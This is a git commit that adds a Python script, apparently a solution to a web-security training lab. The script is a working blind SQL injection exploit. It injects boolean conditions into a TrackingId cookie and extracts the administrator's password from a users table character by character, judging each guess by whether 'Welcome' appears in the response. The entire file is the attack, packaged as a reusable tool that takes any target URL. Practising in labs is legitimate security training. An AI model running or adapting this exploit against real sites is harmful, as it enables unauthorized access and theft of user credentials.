8b004b00955b94f160068fb892a281f6800f273a
Michael Byrd <iamtron01@hotmail.com>
2024-06-25 13:49:50 -0500

    added lab 11

---
+++ sql-injection/sqli-lab-11.py
@@ -0,0 +1,51 @@
+import requests
+import sys
+import urllib3 
+import urllib.parse
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'}
+
+FAIL = -1
+
+def sqli_password(url):
+    password = ""
+    for position in range(1,21):
+        for code in range(32,126):
+            sqli_payload = (
+                "' and (select ascii(substring(password,%s,1)) "
+                "from users where username='administrator')='%s'--" 
+                % (position, code))
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies = {
+                'TrackingId': 'tNQK67eM0kgHw118' + sqli_payload_encoded,
+                'session': 'wovKspiRfMKluOSnenPmpVNkEhN63MIn'}
+            response = requests.get(
+                url, cookies=cookies,
+                verify=False,
+                proxies=proxies)
+            if "Welcome" not in response.text:
+                sys.stdout.write('\r' + password + chr(code))
+                sys.stdout.flush()
+            else:
+                password += chr(code)
+                sys.stdout.write('\r' + password)
+                sys.stdout.flush()
+                break
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+        print("(+) Retrieving administrator password...")
+        sqli_password(url)
+    except IndexError:
+        print("[-] Usage: %s <url>" % sys.argv[0])
+        print("[-] Example: %s www.example.com" % sys.argv[0])
+        sys.exit(FAIL)
+    except Exception as exception:
+        print("An exception occured %s" % exception)
+        print("[-] The SQLi attack was not successful.")
+        sys.exit(FAIL)   
